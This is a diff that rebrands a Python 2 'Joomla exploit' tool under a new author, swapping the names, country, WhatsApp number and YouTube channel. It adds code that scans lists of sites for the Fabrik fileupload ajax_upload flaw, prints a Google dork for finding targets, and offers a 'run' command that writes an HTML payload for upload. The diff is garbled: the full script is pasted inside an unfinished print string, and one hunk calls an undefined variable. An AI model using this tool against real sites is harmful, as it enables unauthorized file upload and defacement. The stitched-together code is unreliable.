@@ -1,8 +1,8 @@
 #!/bin/env python2
-# Script owner="sachin"
-# Created on date 27/10/2018
-# Modified on date 1/11/2018
-# Whats app number 8105190452 
+# Script owner="pakde"
+# Created on date 27/05/2020
+# Modified on date 29/05/2020
+# Whats app number +6283165613244 
 # if u get any bugs send to this number
 # i am studying 4th year civil
 #
@@ -102,7 +102,7 @@ else:
 
 
 logo2 = '''
-Coded by Sachin
+Coded by pakde
 
 \t   |  |-------    __     _____  
 \t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.4\033[1;39m
@@ -149,10 +149,163 @@ while True:
 		scanner()
 	 elif coder[0] == "about":
 		print '\033[1;39m'
-		print '\t Name   : Sachin'
-		print '\t Country: India'
-		print '\t Channel: BBSAD'
-		print '\t Link   : https://youtu.be/87GMKQq_nTs'
+		print '\t Name   : pakde'
+		print '\t Country: Indonesia'
+		print '\t Channel: Pak de'
+		print '\t Link   : 
+#!/bin/env python2
+# Script owner="Pakde"
+# Created on date 27/05/2020
+# Modified on date 29/05/2020
+# Whats app number +6283165613244 
+# if u get any bugs send to this number
+# i am studying 4th year civil
+#
+
+import os
+import sys
+import time
+import urllib2
+
+def cls():
+	if sys.platform == 'linux2':
+		os.system("clear")
+	else:
+		os.system("cls")
+
+#vulnerability scanner
+
+def scanner():
+
+ if os.path.exists(web):
+	pass
+ else:
+	print ''
+	print '\033[1;39m[!] \033[1;31mFile does not exists\033[1;39m'
+	print ''
+	return
+ fi1 = open(web, "r")
+ fi2 = fi1.readlines()
+ fi1.close()
+
+ for site in fi2:
+ 	site = site.rstrip()
+	pooja = 0
+	while pooja <= len(site):
+		pooja = pooja+1
+		if pooja == len(site):
+		   zz = pooja-1
+		   if site[zz:pooja] == "/":
+			neww = list(site)
+			neww.pop()
+			xx = "".join(neww)
+			site = xx
+	darsh = site + payload
+	try:
+         try:
+	  try:
+           ajay = urllib2.urlopen(darsh).read()
+	  except urllib2.HTTPError:
+		 pass
+	 except urllib2.URLError:
+		pass
+	 pat = "check.txt"
+ 	 if os.path.exists(pat):
+        	 os.remove(pat)
+         try:
+ 	  check1 = open("check.txt", "w")
+ 	  check1.write(ajay)
+ 	  check1.close()
+	 except UnboundLocalError:
+	  pass
+ 	 check = open("check.txt" , "r")
+ 	 check2 = check.read()
+ 	 check.close()
+
+ 	 vuln = open("vul.txt", "r")
+ 	 vu = vuln.read()
+ 	 vuln.close()
+	
+	 if check2 != vu:
+		 print "\033[1;39m"
+		 print site 
+		 print check2
+		 print "\033[1;31m[-] Site is not vulnerable\033[1;39m"
+		 print ''
+	 else:
+		 print '\033[1;39m'
+		 print site
+		 print check2
+		 print "\033[1;32m[+] Site is vulnerable\033[1;39m"
+		 print ''
+	except ValueError:
+                pass
+
+logo1 = '''
+\033[1;33mWARNING :\033[1;39m I am not responsible for your actions
+\033[1;36m
+'''
+print logo1
+print ''
+x = raw_input("press enter to continue ...")
+
+if sys.platform == 'linux2':
+	os.system("clear")
+else:
+	os.system("cls")
+
+
+
+logo2 = '''
+Coded by Pakde
+\t   |  |-------    __     _____  
+\t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.4\033[1;39m
+\t\033[1;36m   |  |       | |    |  |_____  |   \033[1;32m JOOMLA EXPLOIT\033[1;36m
+\t   |  |       | |    |        | |_____
+\t   |  |       | |    |        | |     |
+\t|__/  |-------   \__/ \ ______| |     |
+'''
+print logo2
+print "\033[1;31mDork :\033[1;39m inurl:index.php/component/fabrik/ site:\033[1;39m"
+print ""
+def hlp():
+ help= '''\033[1;39m
+\t Commands      Description
+\t\033[1;31m ========      ===========\033[1;39m
+\t
+\t -h/help       Help
+\t set url       set url <targeted site>
+\t set file      set file <filename.txt>
+\t clear         clear screen
+\t scan          Site vulnerability sacanner
+\t run           Creates payload
+\t about         My self
+\t exit          Exit the program
+\t\033[1;39m
+'''
+ print help
+
+main = ""
+u = "< set url >"
+payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
+web = ""
+while True:
+	try:
+	 cod = raw_input("\033[1;39mCoder \033[1;32m>>\033[1;32m ")
+	 coder = cod.split()
+	 if not coder:
+                print "<\033[1;31minvalid command\033[1;39m>"
+                continue
+	 elif coder[0] == "help":
+		hlp()
+	 elif coder[0] == "scan":
+		scanner()
+	 elif coder[0] == "about":
+		print '\033[1;39m'
+		print '\t Name   : Pakde'
+		print '\t Country: Indonesia'
+		print '\t Channel: Pak de'
+		print '\t Link   : https://m.youtube.com/channel/UC3vJ9t4Lg60YTVs1pteVGGQ'
 		print '\t'
 
 	 elif coder[0] == "-h":
@@ -223,8 +376,8 @@ while True:
 			print "[+] Site is vulnerable"
 			sachin = "payload/index.html"
 
-			if os.path.exists(sachin):
-				os.remove(sachin)
+			if os.path.exists(pakde):
+				os.remove(pakde)
 
 			expl = open("payload/index.html" , "w")
 			expl.write("<html><head> \n")
